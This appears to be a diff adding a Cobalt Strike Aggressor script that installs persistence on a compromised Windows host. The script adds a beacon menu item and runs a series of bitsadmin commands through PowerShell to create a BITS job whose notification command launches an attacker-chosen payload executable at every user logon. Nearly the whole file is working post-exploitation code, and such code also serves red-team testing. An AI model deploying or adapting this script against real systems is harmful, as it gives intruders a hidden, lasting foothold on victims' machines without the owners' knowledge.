@@ -1,0 +1,32 @@
+#Bitsadmin Persistence
+#Author: @r3dQu1nn
+#Creates a bitsadmin job for Persistence
+#Credit to: https://twitter.com/Moriarty_Meng/status/993861660405215232
+
+sub persistbits {
+	$bid = $1;
+	$dialog = dialog("Bitsadmin Persistence", %(jobname => "", exe => ""), &bitsadmin);
+	dialog_description($dialog, "Creates a bitsadmin job to execute as your current user context. This job will be executed every time the user logs in. Currently only works on Windows 7, 8, Server 2008, Server 2012.");
+	
+	drow_text($dialog, "jobname",  "Name for bitsadmin job:");
+	drow_text($dialog, "exe", "Payload Executable (Use full path):");
+	
+	dbutton_action($dialog, "Create");
+	dialog_show($dialog);
+
+}
+
+sub bitsadmin {
+    blog($bid, "Installing bitsadmin Persistence as ".$3["jobname"]."..");
+    bpowerpick!($bid, 'bitsadmin /rawreturn /create '.$3['jobname'].'');
+    bpowerpick!($bid, 'bitsadmin /rawreturn /addfile '.$3['jobname'].' C:\\Windows\\System32\\user32.dll C:\\Users\\Public\\Documents\\user32.gif');
+    bpowerpick!($bid, 'bitsadmin /rawreturn /setnotifycmdline '.$3['jobname'].' '.$3['exe'].' NULL');
+    bpowerpick!($bid, 'bitsadmin /rawreturn /setpriority '.$3['jobname'].' high');
+    bpowerpick!($bid, 'bitsadmin /rawreturn /resume '.$3['jobname'].'');
+}
+
+popup beacon_bottom {
+	item "Bitsadmin Persistence" {
+		persistbits($1);
+	}
+}
